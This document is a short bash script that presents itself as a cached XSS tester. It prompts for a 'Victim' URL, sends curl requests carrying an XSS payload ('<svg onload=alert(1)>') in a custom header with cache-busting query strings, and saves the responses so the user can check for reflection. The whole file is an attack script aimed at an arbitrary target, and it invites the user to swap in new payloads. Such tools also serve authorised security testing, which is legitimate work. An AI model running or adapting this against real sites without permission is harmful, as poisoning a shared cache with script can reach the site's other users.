#!/bin/bash
echo -e "[+] Results will be saved as Result files"
echo -e "[+] Open files, if you see reflection, open the link for XSS"
echo -e "[+] You can also enter new payload, by editing cached.sh file"
echo -ne "[+] Enter Victim : "
read victim
echo -e "[+] Performing Cached XSS and writing data in result files"
sleep 1
curl -siH "XSS: <svg onload=alert(1)>" $victim?hqweqweqeihi > result1
curl -siH "XSS: <svg onload=alert(1)>" $victim?hqwkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkki > result2
curl -siH "XSS: <svg onload=alert(1)>" $victim? > result3
echo "";
echo -e "First Payload was: $victim?hqweqweqeihi"
echo -e "Second Payload was: $victim?hqwkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkki"
echo -e "Third Payload was: $victim?"
echo "[+] Copy Paste Requests to see if Cached XSS works";
echo -e "[+] Finished"